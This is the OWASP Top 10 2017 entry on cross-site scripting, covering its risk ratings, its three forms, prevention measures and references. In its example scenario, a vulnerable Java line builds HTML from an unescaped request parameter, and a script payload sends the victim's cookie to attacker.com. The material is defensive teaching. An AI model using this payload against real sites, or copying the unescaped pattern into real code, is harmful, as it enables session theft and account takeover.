# A7:2017 Cross-Site Scripting (XSS)

| Threat agents/Attack vectors                                                                                           | Security Weakness                                                                                                                                                                                                                                      | Impacts                                                                                                                                                                                                              |
| ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Access Lvl : Exploitability 3                                                                                          | Prevalence 3 : Detectability 3                                                                                                                                                                                                                         | Technical 2 : Business                                                                                                                                                                                               |
| Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |

## Is the Application Vulnerable?

There are three forms of XSS, usually targeting users' browsers:

- **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
- **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
- **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.

Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.

## How To Prevent

Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:

- Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.
- Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP  Cheat Sheet 'XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) has details on the required data escaping techniques.
- Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.
- Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).

## Example Attack Scenario

**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
The attacker modifies the ‘CC’ parameter in the browser to:

`'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.

## References

### OWASP

- [OWASP Proactive Controls: Encode Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
- [OWASP Proactive Controls: Validate Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
- [OWASP Application Security Verification Standard: V5](https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md)
- [OWASP Testing Guide: Testing for Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [OWASP Testing Guide: Testing for Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
- [OWASP Testing Guide: Testing for DOM XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
- [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Cheat Sheet: DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP Cheat Sheet: XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [OWASP Java Encoder Project](https://owasp.org/www-project-java-encoder/)

### External

- [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_client-side-template-injection)
